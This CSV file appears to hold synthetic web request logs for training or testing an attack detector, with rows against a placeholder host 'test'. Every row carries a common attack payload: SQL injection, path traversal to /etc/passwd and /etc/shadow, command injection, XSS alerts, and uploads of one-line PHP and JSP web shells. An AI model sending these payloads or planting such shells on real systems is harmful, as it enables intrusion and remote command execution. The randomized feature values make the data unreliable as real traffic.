timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-01T12:42:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,3.57,3,1,8,0,403,1395
2025-01-01T12:43:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.75,10,1,27,0,403,550
2025-01-01T12:44:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.68,3,1,15,0,403,558
2025-01-01T12:45:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.42,10,1,27,0,500,1317
2025-01-01T12:46:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.27,6,1,21,0,403,752
2025-01-01T12:47:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,5.0,8,1,28,0,403,1152
2025-01-01T12:48:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.31,10,1,27,0,403,1586
2025-01-01T12:49:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,6.47,0,1,2,0,302,660
2025-01-01T12:50:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.49,13,1,22,0,302,202
2025-01-01T12:51:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,6.06,0,1,6,0,302,1237
2025-01-01T12:52:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,6.16,7,1,33,0,500,850
2025-01-01T12:53:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.33,7,1,11,0,403,269
2025-01-01T12:54:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,3.5,1,1,3,0,500,1160
2025-01-01T12:55:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,5.82,8,1,28,0,302,672
2025-01-01T12:56:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.11,6,1,22,0,302,546
2025-01-01T12:57:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.73,2,1,11,0,302,660
2025-01-01T12:58:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.16,6,1,22,0,403,1573
2025-01-01T12:59:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.81,7,1,19,0,302,303
2025-01-01T13:00:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.67,6,1,22,0,200,288
2025-01-01T13:01:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,6.04,0,1,2,0,302,655
2025-01-01T13:02:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.85,7,1,11,0,500,1320
2025-01-01T13:03:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,3.71,0,1,6,0,200,463
2025-01-01T13:04:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,3.72,22,1,85,1,403,1073
2025-01-01T13:05:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.79,22,1,85,1,302,209
2025-01-01T13:06:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,4.28,3,1,15,0,403,397
2025-01-01T13:07:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.26,7,1,11,0,403,1023
2025-01-01T13:08:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,6.09,0,1,6,0,302,1207
2025-01-01T13:09:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.73,13,1,22,0,403,1585
2025-01-01T13:10:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.39,13,1,22,0,500,381
2025-01-01T13:11:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.09,19,1,55,1,302,351
2025-01-01T13:12:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,6.4,13,1,22,0,302,1042
2025-01-01T13:13:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.06,3,1,15,0,302,352
2025-01-01T13:14:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.73,0,1,6,0,200,1509
2025-01-01T13:15:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.73,3,1,8,0,500,350
2025-01-01T13:16:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.27,0,1,6,0,403,844
2025-01-01T13:17:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,3.99,10,1,27,0,403,295
2025-01-01T13:18:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.76,22,1,85,1,302,1080
2025-01-01T13:19:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,6.3,3,1,15,0,200,1147
2025-01-01T13:20:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.73,7,1,19,0,302,1492
2025-01-01T13:21:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,6.48,6,1,21,0,302,1206
2025-01-01T13:22:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.67,7,1,33,0,200,752
2025-01-01T13:23:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.15,3,1,8,0,302,630
2025-01-01T13:24:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,6.04,6,1,21,0,500,400
2025-01-01T13:25:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.96,2,1,11,0,500,838
2025-01-01T13:26:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,3.78,10,1,27,0,302,1232
2025-01-01T13:27:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,6.15,3,1,18,0,500,1437
2025-01-01T13:28:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,6.06,6,1,21,0,200,581
2025-01-01T13:29:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,4.62,7,1,25,0,500,1426
2025-01-01T13:30:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,6.02,0,1,2,0,302,607
2025-01-01T13:31:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.67,3,1,8,0,500,424
2025-01-01T13:32:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.44,3,1,15,0,500,1506
2025-01-01T13:33:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.3,22,1,85,1,200,1150
2025-01-01T13:34:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.81,7,1,11,0,500,931
2025-01-01T13:35:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.45,6,1,22,0,500,1159
2025-01-01T13:36:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.24,6,1,21,0,200,1011
2025-01-01T13:37:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.36,7,1,11,0,302,865
2025-01-01T13:38:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,6.42,8,1,28,0,200,1421
2025-01-01T13:39:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.36,19,1,55,1,403,609
2025-01-01T13:40:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,4.64,7,1,19,0,403,1592
2025-01-01T13:41:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.09,6,1,21,0,200,1381
2025-01-01T13:42:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.12,3,1,8,0,200,374
2025-01-01T13:43:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,3.51,7,1,25,0,302,1549
2025-01-01T13:44:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.95,7,1,11,0,403,235
2025-01-01T13:45:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,6.05,3,1,18,0,500,233
2025-01-01T13:46:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,3.92,6,1,21,0,403,764
2025-01-01T13:47:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.28,22,1,85,1,403,554
2025-01-01T13:48:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.72,19,1,55,1,403,547
2025-01-01T13:49:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,4.97,7,1,33,0,500,1578
2025-01-01T13:50:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,3.95,0,1,6,0,403,1202
2025-01-01T13:51:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.0,19,1,55,1,403,965
2025-01-01T13:52:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.42,19,1,55,1,302,251
2025-01-01T13:53:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,5.39,0,1,6,0,403,1333
2025-01-01T13:54:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,4.43,0,1,2,0,500,379
2025-01-01T13:55:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,5.3,0,1,6,0,302,1356
2025-01-01T13:56:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,6.33,3,1,8,0,302,829
2025-01-01T13:57:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,3.61,13,1,22,0,403,939
2025-01-01T13:58:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,3.96,6,1,22,0,302,423
2025-01-01T13:59:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,4.78,7,1,25,0,500,1207
2025-01-01T14:00:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.59,19,1,55,1,302,859
2025-01-01T14:01:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,4.84,3,1,15,0,403,459
2025-01-01T14:02:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.52,3,1,18,0,200,922
2025-01-01T14:03:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.32,22,1,85,1,200,1023
2025-01-01T14:04:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,6.24,8,1,28,0,200,919
2025-01-01T14:05:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.27,19,1,55,1,302,1258
2025-01-01T14:06:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,4.39,6,1,21,0,302,1216
2025-01-01T14:07:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.92,3,1,15,0,302,624
2025-01-01T14:08:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.36,6,1,21,0,500,805
2025-01-01T14:09:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.09,13,1,22,0,302,937
2025-01-01T14:10:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,6.26,6,1,21,0,302,770
2025-01-01T14:11:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.86,7,1,11,0,200,360
2025-01-01T14:12:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,3.86,6,1,21,0,302,469
2025-01-01T14:13:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.15,19,1,55,1,302,333
2025-01-01T14:14:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.16,3,1,15,0,500,1171
2025-01-01T14:15:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.43,10,1,27,0,403,502
2025-01-01T14:16:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.42,3,1,8,0,403,219
2025-01-01T14:17:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,6.49,3,1,15,0,302,1294
2025-01-01T14:18:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,6.12,1,1,3,0,500,621
2025-01-01T14:19:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.8,7,1,11,0,403,769
2025-01-01T14:20:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,5.59,19,1,55,1,200,1589
2025-01-01T14:21:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,5.3,3,1,8,0,200,528
2025-01-01T14:22:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,3.59,7,1,19,0,302,397
2025-01-01T14:23:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,5.96,8,1,28,0,200,1342
2025-01-01T14:24:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.77,19,1,55,1,302,229
2025-01-01T14:25:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.06,6,1,21,0,500,637
2025-01-01T14:26:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.87,6,1,21,0,403,1359
2025-01-01T14:27:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,5.5,6,1,21,0,500,1466
2025-01-01T14:28:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,5.35,0,1,2,0,200,262
2025-01-01T14:29:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,6.14,0,1,2,0,200,1265
2025-01-01T14:30:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.77,19,1,55,1,302,252
2025-01-01T14:31:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,6.03,0,1,2,0,500,1585
2025-01-01T14:32:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.53,3,1,15,0,302,873
2025-01-01T14:33:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,4.73,0,1,2,0,500,1095
2025-01-01T14:34:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.81,7,1,25,0,403,533
2025-01-01T14:35:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,5.27,6,1,22,0,500,1248
2025-01-01T14:36:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,4.9,6,1,21,0,302,1050
2025-01-01T14:37:00Z,offline,GET,http://test/search?q=' UNION SELECT null--,/search,' UNION SELECT null--,21,3.8,6,1,21,0,302,648
2025-01-01T14:38:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,4.47,6,1,22,0,200,1195
2025-01-01T14:39:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,5.35,7,1,11,0,403,719
2025-01-01T14:40:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.57,10,1,27,0,403,1134
2025-01-01T14:41:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,6.32,8,1,28,0,302,1594
2025-01-01T14:42:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,5.0,7,1,19,0,200,868
2025-01-01T14:43:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.23,22,1,85,1,500,1524
2025-01-01T14:44:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.32,8,1,28,0,403,350
2025-01-01T14:45:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.3,13,1,22,0,200,918
2025-01-01T14:46:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.58,3,1,18,0,403,892
2025-01-01T14:47:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.93,7,1,11,0,403,911
2025-01-01T14:48:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.33,13,1,22,0,200,1586
2025-01-01T14:49:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.43,19,1,55,1,500,672
2025-01-01T14:50:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.94,13,1,22,0,500,1528
2025-01-01T14:51:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,4.97,3,1,15,0,302,216
2025-01-01T14:52:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.97,22,1,85,1,302,1139
2025-01-01T14:53:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.31,10,1,27,0,200,914
2025-01-01T14:54:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.84,19,1,55,1,403,734
2025-01-01T14:55:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,5.29,22,1,85,1,500,1198
2025-01-01T14:56:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.36,3,1,15,0,500,966
2025-01-01T14:57:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.89,8,1,28,0,200,1418
2025-01-01T14:58:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,6.26,22,1,85,1,403,1202
2025-01-01T14:59:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.78,22,1,85,1,200,1199
2025-01-01T15:00:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,6.2,7,1,33,0,500,700
2025-01-01T15:01:00Z,offline,GET,http://test/cmd?q=ls;,/cmd,ls;,3,3.64,1,1,3,0,500,352
2025-01-01T15:02:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.44,3,1,8,0,500,1568
2025-01-01T15:03:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,3.76,7,1,33,0,200,964
2025-01-01T15:04:00Z,offline,GET,http://test/cmd?q=id,/cmd,id,2,4.8,0,1,2,0,200,1223
2025-01-01T15:05:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.67,19,1,55,1,200,1518
2025-01-01T15:06:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,4.35,3,1,15,0,500,796
2025-01-01T15:07:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.45,2,1,11,0,403,243
2025-01-01T15:08:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,5.58,2,1,11,0,200,561
2025-01-01T15:09:00Z,offline,GET,http://test/xss?q=%3Cscript%3Ealert(1)%3C/script%3E,/xss,%3Cscript%3Ealert(1)%3C/script%3E,33,5.77,7,1,33,0,403,564
2025-01-01T15:10:00Z,offline,GET,http://test/xss?q=<script>alert(1)</script>,/xss,<script>alert(1)</script>,25,5.34,7,1,25,0,200,706
2025-01-01T15:11:00Z,offline,GET,http://test/search?q=admin'--,/search,admin'--,8,4.18,3,1,8,0,302,476
2025-01-01T15:12:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,6.38,19,1,55,1,403,846
2025-01-01T15:13:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,5.01,13,1,22,0,500,890
2025-01-01T15:14:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,5.87,3,1,15,0,302,656
